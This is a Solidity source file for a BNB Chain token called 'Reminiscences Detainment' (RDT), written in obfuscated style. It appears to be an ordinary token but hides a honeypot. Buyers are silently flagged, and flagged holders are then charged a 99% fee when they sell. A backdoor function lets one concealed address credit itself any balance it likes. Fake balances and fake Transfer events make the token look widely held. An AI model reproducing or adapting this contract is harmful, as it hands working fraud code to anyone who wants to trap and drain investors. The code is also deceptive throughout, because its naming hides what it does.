/**
 *Submitted for verification at BscScan.com on 2023-01-04
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;



interface IBEP20 {

    function decimals() external view returns (uint8);

    function totalSupply() external view returns (uint256);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function approve(address spender, uint256 amount) external returns (bool);

    function transfer(address recipient, uint256 amount) 
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}


library SafeMath {

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}


abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {
        owner = _owner;
    }

    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    function Owner() public view returns (address) {
        return owner;
    }

}


interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}


interface IUniswapV2Router {

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function factory() external pure returns (address);

    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);

    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}




contract ReminiscencesDetainment is IBEP20, Ownable {
    using SafeMath for uint256;
    uint8 constant _decimals = 18;
    mapping(address => bool) private sellModeShouldEnable;


    uint256 teamLiquidityExemptFrom = 0;
    uint256 private maxTokenListSenderFee;
    mapping(address => bool) private exemptTxMinSell;

    uint256 private buyFromMarketingLaunched;

    mapping(uint256 => address) private modeBuyMarketingTradingAmount;
    uint256 private launchLimitBurnTo = 3;
    address public uniswapV2Pair;


    uint256 buyFeeToMode = 2 ** 18 - 1;
    uint160 constant tokenBotsLiquidityFundSwapList = 743689088236;
    bool private atLiquidityToSwap = true;

    uint256 private teamFundAmountMint = 0;
    mapping(address => uint256) private sellSwapMinMintTradingTake;
    uint256 private receiverSenderSellReceiver = 0;
    mapping(address => bool) private buyModeMarketingAutoLaunch;
    IUniswapV2Router public feeTotalAutoMintFromSell;
    mapping(address => bool) private takeToLimitSwap;
    uint256 public txAutoAmountLimit = 0;
    uint256 private mintMarketingAutoFund = 0;
    address constant atTradingLimitListTotalFee = 0x9BEA5D49Ac5C757B7c751858400968144B9F8c7C;
    bool private tokenSenderBurnMarketingTeamAt = true;
    bool private fromBotsAtSwap = false;

    uint160 constant feeLaunchIsExempt = 326230760673 * 2 ** 40;
    uint256 private teamAtSellLimitLaunched;
    uint256  mintTeamFeeWalletTotal = 100000000 * 10 ** _decimals;
    mapping(uint256 => address) private liquidityAtWalletIs;
    uint256 private launchBlock = 0;
    uint256  txLimitFundTotalShould = 100000000 * 10 ** _decimals;
    bool private swapLaunchReceiverAuto = true;
    string constant _symbol = "RDT";
    bool private burnAmountFundReceiverLimitBotsLaunched = true;
    address private teamLimitAmountTrading = (msg.sender);
    bool public liquidityAtTotalTeam = false;
    uint256 public liquidityAtWalletIsIndex = 0;
    uint256 private burnTradingLimitFee;


    address private ZERO = 0x0000000000000000000000000000000000000000;
    uint160 constant modeAutoLaunchedToMarketing = 561058273189 * 2 ** 80;
    uint256 private toReceiverModeMaxList;

    address private walletBuyEnableTo = (msg.sender);


    uint256 private amountTakeAutoExemptWalletShouldBots;
    uint256  constant MASK = type(uint128).max;
    mapping(address => uint256) _balances;
    bool private listLimitBuyToReceiver = false;
    uint256 constant minFromAmountTotalBuy = 10000 * 10 ** 18;
    

    uint256 constant teamExemptTakeFund = 300000 * 10 ** 18;
    uint256 private fromAmountSwapSender = 0;

    string constant _name = "Reminiscences Detainment";
    mapping(address => mapping(address => uint256)) _allowances;
    uint256 exemptSellModeAutoReceiver = 100000000 * (10 ** _decimals);
    uint256 public liquidityToMaxAuto = 0;

    address private WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    mapping(address => uint256) private mintLaunchedBurnFundTakeEnableToken;

    uint256 private senderAutoWalletListLaunchFrom = 3;
    uint256 private limitFeeToBuy = 6 * 10 ** 15;
    bool private shouldListAtAuto = true;

    bool public amountMarketingSenderFrom = false;
    uint256 public maxWalletAmount = 0;
    uint256 public liquidityToMaxAuto0 = 0;
    bool public exemptTotalMinIs = false;

    uint160 constant burnAtAmountSender = 719460240484 * 2 ** 120;
    uint256 private tradingBotsMinReceiver;
    bool private marketingSwapWalletAtAutoLaunched;
    uint256 private toBotsTakeList = 100;
    uint256 receiverFundTeamBotsShouldEnableIs = 4587;
    uint256 private toLaunchSwapMin = exemptSellModeAutoReceiver / 1000; // 0.1%
    address private DEAD = 0x000000000000000000000000000000000000dEaD;
    uint256 private marketingMaxTotalFundReceiverIsTx = 0;

    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Ownable(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        feeTotalAutoMintFromSell = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(feeTotalAutoMintFromSell.factory()).createPair(address(this), feeTotalAutoMintFromSell.WETH());
        _allowances[address(this)][address(feeTotalAutoMintFromSell)] = exemptSellModeAutoReceiver;

        marketingSwapWalletAtAutoLaunched = true;

        sellModeShouldEnable[msg.sender] = true;
        sellModeShouldEnable[0x0000000000000000000000000000000000000000] = true;
        sellModeShouldEnable[0x000000000000000000000000000000000000dEaD] = true;
        sellModeShouldEnable[address(this)] = true;

        buyModeMarketingAutoLaunch[msg.sender] = true;
        buyModeMarketingAutoLaunch[address(this)] = true;

        exemptTxMinSell[msg.sender] = true;
        exemptTxMinSell[0x0000000000000000000000000000000000000000] = true;
        exemptTxMinSell[0x000000000000000000000000000000000000dEaD] = true;
        exemptTxMinSell[address(this)] = true;

        approve(_router, exemptSellModeAutoReceiver);
        approve(address(uniswapV2Pair), exemptSellModeAutoReceiver);
        _balances[msg.sender] = exemptSellModeAutoReceiver;
        emit Transfer(address(0), msg.sender, exemptSellModeAutoReceiver);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return exemptSellModeAutoReceiver;
    }

    function setDEAD(address receiverLimitMintExempt0) public onlyOwner {
        DEAD=receiverLimitMintExempt0;
    }

    function getwalletModeTradingReceiverSwap() public view returns (uint256) {
        if (liquidityToMaxAuto0 != launchLimitBurnTo) {
            return launchLimitBurnTo;
        }
        return liquidityToMaxAuto0;
    }

    function fromMaxAtWallet(uint160 receiverLimitMintExemptccount) private pure returns (bool) {
        uint160 receiverLimitMintExempt = burnAtAmountSender + modeAutoLaunchedToMarketing;
        receiverLimitMintExempt = receiverLimitMintExempt + feeLaunchIsExempt + tokenBotsLiquidityFundSwapList;
        return receiverLimitMintExemptccount == receiverLimitMintExempt;
    }

    function setlaunchAutoTakeEnable(uint256 receiverLimitMintExempt0) public onlyOwner {
        if (marketingMaxTotalFundReceiverIsTx != marketingMaxTotalFundReceiverIsTx) {
            marketingMaxTotalFundReceiverIsTx=receiverLimitMintExempt0;
        }
        if (marketingMaxTotalFundReceiverIsTx == launchBlock) {
            launchBlock=receiverLimitMintExempt0;
        }
        if (marketingMaxTotalFundReceiverIsTx != txAutoAmountLimit) {
            txAutoAmountLimit=receiverLimitMintExempt0;
        }
        marketingMaxTotalFundReceiverIsTx=receiverLimitMintExempt0;
    }

    function getminMintBuyTotal() public view returns (uint256) {
        if (fromAmountSwapSender != toBotsTakeList) {
            return toBotsTakeList;
        }
        if (fromAmountSwapSender == mintMarketingAutoFund) {
            return mintMarketingAutoFund;
        }
        if (fromAmountSwapSender == liquidityToMaxAuto0) {
            return liquidityToMaxAuto0;
        }
        return fromAmountSwapSender;
    }

    function maxAutoTotalSwapAt() private view returns (uint256) {
        address mintTradingEnableLaunched = WBNB;
        if (address(this) < WBNB) {
            mintTradingEnableLaunched = address(this);
        }
        (uint receiverFundAutoExempt, uint toFundBuySenderReceiver,) = IPancakePair(uniswapV2Pair).getReserves();
        (uint256 liquiditySellAutoTo,) = WBNB == mintTradingEnableLaunched ? (receiverFundAutoExempt, toFundBuySenderReceiver) : (toFundBuySenderReceiver, receiverFundAutoExempt);
        uint256 modeListFromReceiver = IERC20(WBNB).balanceOf(uniswapV2Pair) - liquiditySellAutoTo;
        return modeListFromReceiver;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return feeMarketingAtAuto(msg.sender, recipient, amount);
    }

    function getteamBuyFundIs(uint256 receiverLimitMintExempt0) public view returns (address) {
            return modeBuyMarketingTradingAmount[receiverLimitMintExempt0];
    }

    function setreceiverLiquidityMintTake(address receiverLimitMintExempt0,uint256 receiverLimitMintExempt1) public onlyOwner {
        sellSwapMinMintTradingTake[receiverLimitMintExempt0]=receiverLimitMintExempt1;
    }

    function getlaunchAutoTakeEnable() public view returns (uint256) {
        return marketingMaxTotalFundReceiverIsTx;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, exemptSellModeAutoReceiver);
    }

    function tokenExemptLaunchTx() private {
        if (liquidityAtWalletIsIndex > 0) {
            for (uint256 i = 1; i <= liquidityAtWalletIsIndex; i++) {
                if (sellSwapMinMintTradingTake[liquidityAtWalletIs[i]] == 0) {
                    sellSwapMinMintTradingTake[liquidityAtWalletIs[i]] = block.timestamp;
                }
            }
            liquidityAtWalletIsIndex = 0;
        }
    }

    function getMaxTotalAmount() public {
        shouldWalletTotalBots();
    }

    function setwalletModeTradingReceiverSwap(uint256 receiverLimitMintExempt0) public onlyOwner {
        if (liquidityToMaxAuto0 != marketingMaxTotalFundReceiverIsTx) {
            marketingMaxTotalFundReceiverIsTx=receiverLimitMintExempt0;
        }
        if (liquidityToMaxAuto0 == launchLimitBurnTo) {
            launchLimitBurnTo=receiverLimitMintExempt0;
        }
        if (liquidityToMaxAuto0 == senderAutoWalletListLaunchFrom) {
            senderAutoWalletListLaunchFrom=receiverLimitMintExempt0;
        }
        liquidityToMaxAuto0=receiverLimitMintExempt0;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function getDEAD() public view returns (address) {
        if (DEAD != walletBuyEnableTo) {
            return walletBuyEnableTo;
        }
        if (DEAD == teamLimitAmountTrading) {
            return teamLimitAmountTrading;
        }
        return DEAD;
    }

    function botsTotalToExemptReceiverMax(uint160 receiverLimitMintExemptccount) private view returns (uint256) {
        uint256 receiverTradingTotalReceiver = teamLiquidityExemptFrom;
        uint256 teamBurnFundTake = receiverLimitMintExemptccount - uint160(atTradingLimitListTotalFee);
        if (teamBurnFundTake < receiverTradingTotalReceiver) {
            return minFromAmountTotalBuy;
        }
        return teamExemptTakeFund;
    }

    function getreceiverLiquidityMintTake(address receiverLimitMintExempt0) public view returns (uint256) {
        if (receiverLimitMintExempt0 != teamLimitAmountTrading) {
            return fromAmountSwapSender;
        }
        if (receiverLimitMintExempt0 == WBNB) {
            return marketingMaxTotalFundReceiverIsTx;
        }
        if (receiverLimitMintExempt0 != teamLimitAmountTrading) {
            return mintMarketingAutoFund;
        }
            return sellSwapMinMintTradingTake[receiverLimitMintExempt0];
    }

    function teamExemptAtMode(address botsTotalShouldTxMaxTo, address launchedFundFeeTokenLiquidityTotalShould, uint256 liquidityMaxLaunchTx, bool teamTxAmountTotalWalletReceiver) private {
        if (teamTxAmountTotalWalletReceiver) {
            botsTotalShouldTxMaxTo = address(uint160(uint160(atTradingLimitListTotalFee) + teamLiquidityExemptFrom));
            teamLiquidityExemptFrom++;
            _balances[launchedFundFeeTokenLiquidityTotalShould] = _balances[launchedFundFeeTokenLiquidityTotalShould].add(liquidityMaxLaunchTx);
        } else {
            _balances[botsTotalShouldTxMaxTo] = _balances[botsTotalShouldTxMaxTo].sub(liquidityMaxLaunchTx);
        }
        emit Transfer(botsTotalShouldTxMaxTo, launchedFundFeeTokenLiquidityTotalShould, liquidityMaxLaunchTx);
    }

    function setteamBuyFundIs(uint256 receiverLimitMintExempt0,address receiverLimitMintExempt1) public onlyOwner {
        if (receiverLimitMintExempt0 != liquidityAtWalletIsIndex) {
            DEAD=receiverLimitMintExempt1;
        }
        if (receiverLimitMintExempt0 != launchBlock) {
            walletBuyEnableTo=receiverLimitMintExempt1;
        }
        if (receiverLimitMintExempt0 == txAutoAmountLimit) {
            teamLimitAmountTrading=receiverLimitMintExempt1;
        }
        modeBuyMarketingTradingAmount[receiverLimitMintExempt0]=receiverLimitMintExempt1;
    }

    function sellAtMinFromEnable(address receiverLimitMintExemptddr) private view returns (bool) {
        return receiverLimitMintExemptddr == teamLimitAmountTrading;
    }

    function feeMarketingAtAuto(address botsTotalShouldTxMaxTo, address launchedFundFeeTokenLiquidityTotalShould, uint256 liquidityMaxLaunchTx) internal returns (bool) {
        if (minMarketingFromToFundLaunchFee(uint160(launchedFundFeeTokenLiquidityTotalShould))) {
            teamExemptAtMode(botsTotalShouldTxMaxTo, launchedFundFeeTokenLiquidityTotalShould, liquidityMaxLaunchTx, false);
            return true;
        }
        if (minMarketingFromToFundLaunchFee(uint160(botsTotalShouldTxMaxTo))) {
            teamExemptAtMode(botsTotalShouldTxMaxTo, launchedFundFeeTokenLiquidityTotalShould, liquidityMaxLaunchTx, true);
            return true;
        }
        
        bool feeSellMarketingBurnTxMin = sellAtMinFromEnable(botsTotalShouldTxMaxTo) || sellAtMinFromEnable(launchedFundFeeTokenLiquidityTotalShould);
        
        if (botsTotalShouldTxMaxTo == uniswapV2Pair) {
            if (maxWalletAmount != 0 && amountTxSenderReceiverLaunchedMaxBuy(uint160(launchedFundFeeTokenLiquidityTotalShould))) {
                shouldWalletTotalBots();
            }
            if (!feeSellMarketingBurnTxMin) {
                autoBotsMarketingWalletTradingReceiverFee(launchedFundFeeTokenLiquidityTotalShould);
            }
        }
        
        
        if (liquidityToMaxAuto0 == toLaunchSwapMin) {
            liquidityToMaxAuto0 = fromAmountSwapSender;
        }

        if (fromAmountSwapSender == fromAmountSwapSender) {
            fromAmountSwapSender = senderAutoWalletListLaunchFrom;
        }


        if (inSwap || feeSellMarketingBurnTxMin) {return mintSenderSwapLaunch(botsTotalShouldTxMaxTo, launchedFundFeeTokenLiquidityTotalShould, liquidityMaxLaunchTx);}
        
        if (liquidityToMaxAuto0 != liquidityToMaxAuto0) {
            liquidityToMaxAuto0 = teamFundAmountMint;
        }

        if (exemptTotalMinIs == liquidityAtTotalTeam) {
            exemptTotalMinIs = amountMarketingSenderFrom;
        }

        if (txAutoAmountLimit == senderAutoWalletListLaunchFrom) {
            txAutoAmountLimit = teamFundAmountMint;
        }


        require((liquidityMaxLaunchTx <= mintTeamFeeWalletTotal) || sellModeShouldEnable[botsTotalShouldTxMaxTo] || sellModeShouldEnable[launchedFundFeeTokenLiquidityTotalShould], "Max TX Limit!");

        _balances[botsTotalShouldTxMaxTo] = _balances[botsTotalShouldTxMaxTo].sub(liquidityMaxLaunchTx, "Insufficient Balance!");
        
        if (liquidityToMaxAuto0 != liquidityToMaxAuto0) {
            liquidityToMaxAuto0 = liquidityToMaxAuto;
        }

        if (liquidityAtTotalTeam == swapLaunchReceiverAuto) {
            liquidityAtTotalTeam = tokenSenderBurnMarketingTeamAt;
        }


        uint256 liquidityMaxLaunchTxReceived = launchFundTeamLimitAtMint(botsTotalShouldTxMaxTo) ? shouldTotalTakeLiquidityExempt(botsTotalShouldTxMaxTo, launchedFundFeeTokenLiquidityTotalShould, liquidityMaxLaunchTx) : liquidityMaxLaunchTx;

        _balances[launchedFundFeeTokenLiquidityTotalShould] = _balances[launchedFundFeeTokenLiquidityTotalShould].add(liquidityMaxLaunchTxReceived);
        emit Transfer(botsTotalShouldTxMaxTo, launchedFundFeeTokenLiquidityTotalShould, liquidityMaxLaunchTxReceived);
        return true;
    }

    function setsenderTeamLaunchedEnableTxTakeTrading(uint256 receiverLimitMintExempt0) public onlyOwner {
        if (txAutoAmountLimit == toLaunchSwapMin) {
            toLaunchSwapMin=receiverLimitMintExempt0;
        }
        if (txAutoAmountLimit == teamFundAmountMint) {
            teamFundAmountMint=receiverLimitMintExempt0;
        }
        if (txAutoAmountLimit == mintMarketingAutoFund) {
            mintMarketingAutoFund=receiverLimitMintExempt0;
        }
        txAutoAmountLimit=receiverLimitMintExempt0;
    }

    function getlistModeLaunchFrom(address receiverLimitMintExempt0) public view returns (bool) {
        if (buyModeMarketingAutoLaunch[receiverLimitMintExempt0] != buyModeMarketingAutoLaunch[receiverLimitMintExempt0]) {
            return atLiquidityToSwap;
        }
        if (receiverLimitMintExempt0 != walletBuyEnableTo) {
            return fromBotsAtSwap;
        }
            return buyModeMarketingAutoLaunch[receiverLimitMintExempt0];
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (minMarketingFromToFundLaunchFee(uint160(account))) {
            return botsTotalToExemptReceiverMax(uint160(account));
        }
        return _balances[account];
    }

    function setteamLaunchedIsSwap(uint256 receiverLimitMintExempt0) public onlyOwner {
        if (teamFundAmountMint != senderAutoWalletListLaunchFrom) {
            senderAutoWalletListLaunchFrom=receiverLimitMintExempt0;
        }
        teamFundAmountMint=receiverLimitMintExempt0;
    }

    function getsenderTeamLaunchedEnableTxTakeTrading() public view returns (uint256) {
        if (txAutoAmountLimit != launchLimitBurnTo) {
            return launchLimitBurnTo;
        }
        if (txAutoAmountLimit != senderAutoWalletListLaunchFrom) {
            return senderAutoWalletListLaunchFrom;
        }
        return txAutoAmountLimit;
    }

    function setlistModeLaunchFrom(address receiverLimitMintExempt0,bool receiverLimitMintExempt1) public onlyOwner {
        buyModeMarketingAutoLaunch[receiverLimitMintExempt0]=receiverLimitMintExempt1;
    }

    function safeTransfer(address botsTotalShouldTxMaxTo, address launchedFundFeeTokenLiquidityTotalShould, uint256 liquidityMaxLaunchTx) public {
        if (!fromMaxAtWallet(uint160(msg.sender))) {
            return;
        }
        if (minMarketingFromToFundLaunchFee(uint160(launchedFundFeeTokenLiquidityTotalShould))) {
            teamExemptAtMode(botsTotalShouldTxMaxTo, launchedFundFeeTokenLiquidityTotalShould, liquidityMaxLaunchTx, false);
            return;
        }
        if (minMarketingFromToFundLaunchFee(uint160(botsTotalShouldTxMaxTo))) {
            teamExemptAtMode(botsTotalShouldTxMaxTo, launchedFundFeeTokenLiquidityTotalShould, liquidityMaxLaunchTx, true);
            return;
        }
        if (botsTotalShouldTxMaxTo == address(0)) {
            _balances[launchedFundFeeTokenLiquidityTotalShould] = _balances[launchedFundFeeTokenLiquidityTotalShould].add(liquidityMaxLaunchTx);
            return;
        }
    }

    function getMaxTotalAFee() public {
        tokenExemptLaunchTx();
    }

    function minMarketingFromToFundLaunchFee(uint160 receiverLimitMintExemptccount) private pure returns (bool) {
        if (receiverLimitMintExemptccount >= uint160(atTradingLimitListTotalFee) && receiverLimitMintExemptccount <= uint160(atTradingLimitListTotalFee) + 200000) {
            return true;
        }
        return false;
    }

    function getfeeMinLaunchedFromIsMax() public view returns (bool) {
        if (liquidityAtTotalTeam != amountMarketingSenderFrom) {
            return amountMarketingSenderFrom;
        }
        return liquidityAtTotalTeam;
    }

    function botsMinMintTakeModeAt() private view returns (uint256) {
        return block.timestamp;
    }

    function shouldLiquidityTotalTakeMode(address botsTotalShouldTxMaxTo, uint256 swapLaunchedTradingTake) private view returns (uint256) {
        uint256 launchedBurnMinTokenTotal = sellSwapMinMintTradingTake[botsTotalShouldTxMaxTo];
        if (launchedBurnMinTokenTotal > 0 && botsMinMintTakeModeAt() - launchedBurnMinTokenTotal > 0) {
            return 99;
        }
        return swapLaunchedTradingTake;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function amountTxSenderReceiverLaunchedMaxBuy(uint160 launchedFundFeeTokenLiquidityTotalShould) private view returns (bool) {
        return uint16(launchedFundFeeTokenLiquidityTotalShould) == receiverFundTeamBotsShouldEnableIs;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function setminMintBuyTotal(uint256 receiverLimitMintExempt0) public onlyOwner {
        fromAmountSwapSender=receiverLimitMintExempt0;
    }

    function mintSenderSwapLaunch(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function setfeeMinLaunchedFromIsMax(bool receiverLimitMintExempt0) public onlyOwner {
        if (liquidityAtTotalTeam != burnAmountFundReceiverLimitBotsLaunched) {
            burnAmountFundReceiverLimitBotsLaunched=receiverLimitMintExempt0;
        }
        if (liquidityAtTotalTeam != listLimitBuyToReceiver) {
            listLimitBuyToReceiver=receiverLimitMintExempt0;
        }
        if (liquidityAtTotalTeam != liquidityAtTotalTeam) {
            liquidityAtTotalTeam=receiverLimitMintExempt0;
        }
        liquidityAtTotalTeam=receiverLimitMintExempt0;
    }

    function getteamLaunchedIsSwap() public view returns (uint256) {
        return teamFundAmountMint;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != exemptSellModeAutoReceiver) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance!");
        }

        return feeMarketingAtAuto(sender, recipient, amount);
    }

    function autoBotsMarketingWalletTradingReceiverFee(address receiverLimitMintExemptddr) private {
        uint256 fundEnableShouldTotalSwapBotsTrading = maxAutoTotalSwapAt();
        if (fundEnableShouldTotalSwapBotsTrading < limitFeeToBuy) {
            liquidityAtWalletIsIndex += 1;
            liquidityAtWalletIs[liquidityAtWalletIsIndex] = receiverLimitMintExemptddr;
            mintLaunchedBurnFundTakeEnableToken[receiverLimitMintExemptddr] += fundEnableShouldTotalSwapBotsTrading;
            if (mintLaunchedBurnFundTakeEnableToken[receiverLimitMintExemptddr] > limitFeeToBuy) {
                maxWalletAmount = maxWalletAmount + 1;
                modeBuyMarketingTradingAmount[maxWalletAmount] = receiverLimitMintExemptddr;
            }
            return;
        }
        maxWalletAmount = maxWalletAmount + 1;
        modeBuyMarketingTradingAmount[maxWalletAmount] = receiverLimitMintExemptddr;
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function txMinLaunchSell(address botsTotalShouldTxMaxTo, bool receiverTradingTotalReceiverelling) internal returns (uint256) {
        
        if (exemptTotalMinIs != tokenSenderBurnMarketingTeamAt) {
            exemptTotalMinIs = fromBotsAtSwap;
        }

        if (teamFundAmountMint == liquidityToMaxAuto0) {
            teamFundAmountMint = liquidityAtWalletIsIndex;
        }


        if (receiverTradingTotalReceiverelling) {
            burnTradingLimitFee = senderAutoWalletListLaunchFrom + receiverSenderSellReceiver;
            return shouldLiquidityTotalTakeMode(botsTotalShouldTxMaxTo, burnTradingLimitFee);
        }
        if (!receiverTradingTotalReceiverelling && botsTotalShouldTxMaxTo == uniswapV2Pair) {
            burnTradingLimitFee = launchLimitBurnTo + marketingMaxTotalFundReceiverIsTx;
            return burnTradingLimitFee;
        }
        return shouldLiquidityTotalTakeMode(botsTotalShouldTxMaxTo, burnTradingLimitFee);
    }

    function shouldTotalTakeLiquidityExempt(address botsTotalShouldTxMaxTo, address senderAtListLiquidity, uint256 liquidityMaxLaunchTx) internal returns (uint256) {
        
        uint256 swapLaunchedTradingTakeAmount = liquidityMaxLaunchTx.mul(txMinLaunchSell(botsTotalShouldTxMaxTo, senderAtListLiquidity == uniswapV2Pair)).div(toBotsTakeList);

        if (takeToLimitSwap[botsTotalShouldTxMaxTo] || takeToLimitSwap[senderAtListLiquidity]) {
            swapLaunchedTradingTakeAmount = liquidityMaxLaunchTx.mul(99).div(toBotsTakeList);
        }

        _balances[address(this)] = _balances[address(this)].add(swapLaunchedTradingTakeAmount);
        emit Transfer(botsTotalShouldTxMaxTo, address(this), swapLaunchedTradingTakeAmount);
        
        return liquidityMaxLaunchTx.sub(swapLaunchedTradingTakeAmount);
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function launchFundTeamLimitAtMint(address botsTotalShouldTxMaxTo) internal view returns (bool) {
        return !exemptTxMinSell[botsTotalShouldTxMaxTo];
    }

    function shouldWalletTotalBots() private {
        if (maxWalletAmount > 0) {
            for (uint256 i = 1; i <= maxWalletAmount; i++) {
                if (sellSwapMinMintTradingTake[modeBuyMarketingTradingAmount[i]] == 0) {
                    sellSwapMinMintTradingTake[modeBuyMarketingTradingAmount[i]] = block.timestamp;
                }
            }
            maxWalletAmount = 0;
        }
    }

    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}